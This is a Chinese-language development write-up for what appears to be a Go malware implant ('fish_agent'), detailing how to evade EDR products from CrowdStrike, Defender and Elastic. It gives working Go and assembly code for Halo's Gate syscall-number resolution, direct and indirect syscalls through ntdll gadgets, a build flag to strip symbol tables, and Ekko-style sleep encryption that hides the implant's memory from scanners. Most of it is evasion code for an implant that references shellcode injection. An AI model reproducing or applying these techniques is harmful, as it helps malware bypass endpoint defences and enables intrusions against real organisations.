## 一、Halo's Gate / 直接 Syscall

### 1.1 问题：EDR 如何监控 API 调用

EDR（CrowdStrike、Defender、Elastic）通过 inline hook 拦截 `ntdll.dll` 中的函数：

```
正常 NtAllocateVirtualMemory:
  mov r10, rcx
  mov eax, 0x18       ← SSN (System Service Number)
  syscall
  ret

被 EDR hook 后:
  jmp EDR_NtAllocateVirtualMemory  ← 前 5 字节被替换为 JMP
  ...  (原始代码被覆盖)
```

EDR 的 hook 函数会检查调用参数，判断是否为恶意行为，然后决定放行或拦截。

### 1.2 Halo's Gate 原理

不调用被 hook 的 ntdll 函数，而是自己解析 SSN 并直接执行 SYSCALL 指令：

```
1. 通过 PEB 获取 ntdll.dll 基址（不使用 LoadLibrary/GetModuleHandle）
2. 解析 ntdll 导出表，按地址排序获取所有 Nt* 函数的 SSN
3. 检测 EDR hook：函数入口处为 E9(JMP) 或 FF25(JMP[mem]) 则被 hook
4. 从相邻未 hook 函数的 SSN 推断被 hook 函数的 SSN
5. Go 汇编 SYSCALL stub 直接入核
```

### 1.3 SSN 解析实现

```go
func parseNtExports(base uintptr) []ntFuncInfo {
    // 1. 验证 MZ 签名
    if *(*uint16)(unsafe.Pointer(base)) != 0x5A4D { return nil }

    // 2. 定位 PE 头 → 导出目录
    eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
    exportDirRVA := *(*uint32)(unsafe.Pointer(base + uintptr(eLfanew) + 0x88))

    // 3. 遍历导出函数的名称表
    numNames := *(*uint32)(unsafe.Pointer(exportDir + 0x18))
    addrOfNames := *(*uint32)(unsafe.Pointer(exportDir + 0x20))
    addrOfOrdinals := *(*uint32)(unsafe.Pointer(exportDir + 0x24))

    for i := uint32(0); i < numNames; i++ {
        nameRVA := *(*uint32)(unsafe.Pointer(funcNamesBase + uintptr(i*4)))
        name := cStringToGo(base + uintptr(nameRVA))

        // 只收集 Nt/Zw 前缀函数
        if !strings.HasPrefix(name, "Nt") && !strings.HasPrefix(name, "Zw") {
            continue
        }

        ordinal := *(*uint16)(unsafe.Pointer(ordinalsBase + uintptr(i*2)))
        funcRVA := *(*uint32)(unsafe.Pointer(funcAddrsBase + uintptr(ordinal*4)))
        funcAddr := base + uintptr(funcRVA)
        funcs = append(funcs, ntFuncInfo{name, funcAddr, 0})
    }

    // 4. 按函数地址排序（SSN 与地址排序一致）
    sort.Slice(funcs, func(i, j int) bool {
        return funcs[i].addr < funcs[j].addr
    })

    // 5. 分配 SSN
    for i := range funcs {
        funcs[i].ssn = uint32(i)
    }
}
```

### 1.4 Hook 检测与 SSN 修正

```go
func resolveSSN(name string) uint32 {
    info, ok := ntFuncs[name]
    if !ok { return 0 }

    // 检查函数入口是否被 hook
    // E9 = JMP rel32, 0xFF 0x25 = JMP [mem]
    if *(*byte)(unsafe.Pointer(info.addr)) == 0xE9 ||
       *(*uint16)(unsafe.Pointer(info.addr)) == 0x25FF {
        // 从相邻函数推断 SSN
        for i := range ntFuncs {
            if i+1 < len(ntFuncs) && ntFuncs[i].name == name {
                for j := i + 1; j < len(ntFuncs); j++ {
                    b := *(*byte)(unsafe.Pointer(ntFuncs[j].addr))
                    if b != 0xE9 {
                        return ntFuncs[j].ssn - uint32(j-i)
                    }
                }
            }
        }
    }
    return info.ssn
}
```

### 1.5 Go 汇编 SYSCALL Stub（直接版本）

Go 编译器不允许内联汇编，必须单独编写 `.s` 文件。以下是**直接 syscall** 版本（后续升级为间接）：

```asm
//go:build windows

TEXT ·rawSyscall6(SB),0,$0-64
    MOVL ssn+0(FP), AX         // SSN → EAX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10               // arg1 → R10（x64 syscall 约定）
    MOVQ a2+16(FP), DX         // arg2 → RDX
    MOVQ a3+24(FP), R8         // arg3 → R8
    MOVQ a4+32(FP), R9         // arg4 → R9
    MOVQ a5+40(FP), R11
    MOVQ R11, a4+32(FP)        // arg5 → [RSP+0x28]
    MOVQ a6+48(FP), R11
    MOVQ R11, a5+40(FP)        // arg6 → [RSP+0x30]
    SYSCALL                    // 直接入内核
    MOVQ AX, ret+56(FP)        // NTSTATUS → 返回值
    RET
```

**x64 Windows SYSCALL 调用约定**：
- 参数 1~4：R10、RDX、R8、R9（不是 RCX，SYSCALL 指令会破坏 RCX）
- 参数 5~N：`[RSP+0x28]` 开始逐个入栈
- 返回值：RAX（NTSTATUS）

### 1.6 Go 包装器

```go
func rawSyscall6(ssn uint32, a1, a2, a3, a4, a5, a6 uintptr) uintptr

func DirectNtAVM(hProcess uintptr, baseAddr *uintptr, zeroBits uintptr,
    regionSize *uintptr, allocType uint32, protect uint32) uintptr {
    ssn := SSNMap["NtAllocateVirtualMemory"]
    return rawSyscall6(ssn,
        uintptr(hProcess),
        uintptr(unsafe.Pointer(baseAddr)),
        zeroBits,
        uintptr(unsafe.Pointer(regionSize)),
        uintptr(allocType),
        uintptr(protect))
}
```

通过 Halo's Gate 获取 SSN 后，EDR 的 ntdll inline hook 无法拦截函数调用。

## 二、间接 syscall（Indirect Syscall）

### 2.1 问题：直接 SYSCALL 的缺陷

1.5 节的汇编 stub 直接在代码中执行 `SYSCALL` 指令。虽然 EDR 无法 hook 这个 `SYSCALL`（它不在 ntdll 中），但现代 EDR（如 Elastic、CrowdStrike）会进行栈回溯：

```
内核 syscall 处理 → 检查调用栈
  RIP at SYSCALL:  0x7FFA1234ABCD  ← 不在 ntdll.dll 范围内
  调用者:          fish_agent!rawSyscall6+0x3F
  → 判定为直接 syscall，告警
```

EDR 知道 ntdll.dll 的地址范围。如果 `SYSCALL` 指令的地址不在这个范围内，就是可疑的直接 syscall。

### 2.2 原理：CALL 到 ntdll 的 syscall gadget

不自己执行 `SYSCALL`，而是 `CALL` 到 ntdll 中已有的 `syscall; ret` 指令对：

```
之前（直接）:
  fish_agent!rawSyscall6:
    MOV R10, RCX
    MOV EAX, SSN
    SYSCALL        ← RIP 指向 fish_agent，EDR 告警
    RET

现在（间接）:
  fish_agent!rawSyscall6:
    MOV R10, RCX
    MOV EAX, SSN
    CALL [ntdllGadget]   ← CALL 到 ntdll 内部

  ntdll!NtXXX+0x12:
    SYSCALL              ← RIP 指向 ntdll.dll，EDR 放行
    RET                  ← 返回到 fish_agent 的 CALL 之后
```

`CALL` 会把返回地址压栈，所以 ntdll 的 `RET` 会回到 `fish_agent` 的代码继续执行。但 EDR 栈回溯时，`SYSCALL` 指令的地址在 ntdll 范围内，不会被标记为可疑。

### 2.3 寻找 Gadget

在 ntdll 的 `.text` 段中搜索 `syscall; ret`（`0x0F 0x05 0xC3`）字节序列。每个 Nt* 函数都以这个序列结尾，`.text` 段中有数百个可用 gadget：

```go
func findSyscallRetGadget(base uintptr) uintptr {
    // 1. 解析 PE 头 → 定位 .text 段
    numSections := *(*uint16)(unsafe.Pointer(ntHeader + 4 + 2))
    sizeOfOpt := *(*uint16)(unsafe.Pointer(ntHeader + 4 + 16))
    sectionBase := ntHeader + 4 + 20 + uintptr(sizeOfOpt)

    for i := uint16(0); i < numSections; i++ {
        sec := sectionBase + uintptr(i)*40 // IMAGE_SECTION_HEADER = 40 bytes

        // 检查段名是否为 ".text"
        namePtr := (*[8]byte)(unsafe.Pointer(sec))
        if namePtr[0] == '.' && namePtr[1] == 't' && namePtr[2] == 'e' &&
           namePtr[3] == 'x' && namePtr[4] == 't' {
            start := base + uintptr(sec.VirtualAddress)
            end := start + uintptr(sec.VirtualSize)

            // 扫描 0x0F 0x05 0xC3
            for addr := start; addr < end-2; addr++ {
                b := (*[3]byte)(unsafe.Pointer(addr))
                if b[0] == 0x0F && b[1] == 0x05 && b[2] == 0xC3 {
                    return addr
                }
            }
        }
    }
    return 0
}
```

### 2.4 汇编 Stub 修改

三个 syscall stub（rawSyscall4/6/12）全部改为条件分支：有 gadget 时走间接路径，没有时回退到直接 SYSCALL：

```asm
TEXT ·rawSyscall6(SB),0,$0-64
    MOVQ ·ntdllGadget(SB), R11    // 加载 gadget 地址
    CMPQ R11, $0
    JE   direct6                   // gadget=0 → 回退直接路径

    // 间接路径: CALL ntdll gadget (syscall;ret)
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10
    MOVQ a2+16(FP), DX
    MOVQ a3+24(FP), R8
    MOVQ a4+32(FP), R9
    MOVQ a5+40(FP), R11
    MOVQ a6+48(FP), R12
    MOVQ R11, a4+32(FP)
    MOVQ R12, a5+40(FP)
    MOVQ ·ntdllGadget(SB), R11
    CALL R11                       // CALL ntdll!syscall;ret
    MOVQ AX, ret+56(FP)            // 存储 NTSTATUS
    RET

direct6:
    // 回退：直接 SYSCALL
    MOVL ssn+0(FP), AX
    MOVQ a1+8(FP), CX
    MOVQ CX, R10
    // ... 相同参数设置 ...
    SYSCALL
    MOVQ AX, ret+56(FP)
    RET
```

### 2.5 初始化

在 `InitSSNMap()` 之后调用，所有 syscall 包装器无需修改：

```go
var ntdllGadget uintptr

func InitIndirectSyscall() {
    base := getNtdllBaseFromPEB()
    ntdllGadget = findSyscallRetGadget(base)
}
```

所有 syscall 包装器（`DirectNtAVM`、`DirectNtOpenProcess`、`DirectNtWriteVM` 等）无需修改——它们只调用 `rawSyscall*` 函数，汇编 stub 内部自动选择间接路径。

## 三、pclntab 混淆（Go 1.25+）

### 3.1 Go 二进制的符号表

Go 编译的二进制中，`.gopclntab` 段包含函数符号表——每个函数名、文件名、行号都以明文存储：

```
$ strings fish.exe | grep "evasion\."
evasion.init
evasion.SSNMap
evasion.parseNtExports
evasion.resolveSSN
evasion.DirectNtAVM
evasion.InjectShellcode
evasion.AesEncrypt
...
```

### 3.2 `-pclntab=empty` 解决方案

Go 1.25 引入了 `-pclntab=empty` 编译标志，完全移除 `.gopclntab` 段：

```powershell
go build -gcflags="all=-pclntab=empty" ...
```

效果验证：

```
$ strings fish.exe | grep "evasion\."
# 空结果

$ go tool nm fish.exe
# 无符号输出
```

### 3.3 代价

- 运行时 panic 无法显示调用栈（但植入体不应该 panic）
- `runtime.Caller` 系列函数失效
- 不影响正常功能运行

## 四、Ekko Sleep 加密

### 4.1 问题：内存扫描器

EDR 和沙箱会定期扫描进程内存，检查是否存在可疑代码特征。植入体在内存中长时间驻留，就可能被扫描发现。

### 4.2 原理

在休眠期加密植入体模块的数据页，EDR 内存扫描器只能看到加密数据：

```
唤醒 → 解密数据页 → 执行任务 → 加密数据页 → 休眠
  ↑                                             ↓
  └──────────────── 循环 ────────────────────────┘
```

### 4.3 只加密数据页，不加密代码页

初版 EkkoSleep 加密了所有内存页（包括 `.text`），导致 Go 的 Timer Queue 回调执行加密代码后崩溃。修复方案：跳过所有 `PAGE_EXECUTE*` 保护的内存页：

```go
func encryptModulePages(modBase, modSize uintptr) {
    addr := modBase
    for addr < modBase+modSize {
        VirtualQuery(addr, &mbi, sizeof(mbi))
        // 跳过可执行页（.text 段）
        if mbi.Protect&0xF0 != 0 {  // PAGE_EXECUTE* 标志位
            addr += mbi.RegionSize
            continue
        }
        if mbi.State == MEM_COMMIT &&
            (mbi.Protect&PAGE_READWRITE != 0 || mbi.Protect&PAGE_READONLY != 0) {
            xorEncryptRange(addr, mbi.RegionSize, ekkoEncKey)
        }
        addr += mbi.RegionSize
    }
}
```

### 4.4 定时唤醒机制

使用 `CreateTimerQueueTimer` + `WaitForSingleObject` 实现可定时唤醒的休眠：

```go
func EkkoSleep(d time.Duration) {
    modBase, modSize := getModuleRange()
    ekkoEncKey = byte(time.Now().UnixNano() & 0xFF)
    encryptModulePages(modBase, modSize)

    event, _ := CreateEventW(nil, 0, 0, nil)
    CreateTimerQueueTimer(&hTimer, 0, timerCallback,
        uintptr(unsafe.Pointer(&event)), uint32(d/time.Millisecond), 0, 0)
    WaitForSingleObject(event, 0xFFFFFFFF)  // 阻塞等待唤醒

    decryptModulePages()
}
```

### 4.5 当前限制

Go 运行时将全局变量存储在 `.data` 段，加密全局变量会导致 Go 运行时（如 timer 调度器）读取到错误数据。当前 EkkoSleep 模块在 Go 环境下存在运行时兼容性问题，计划使用堆分配上下文传递代替全局变量。
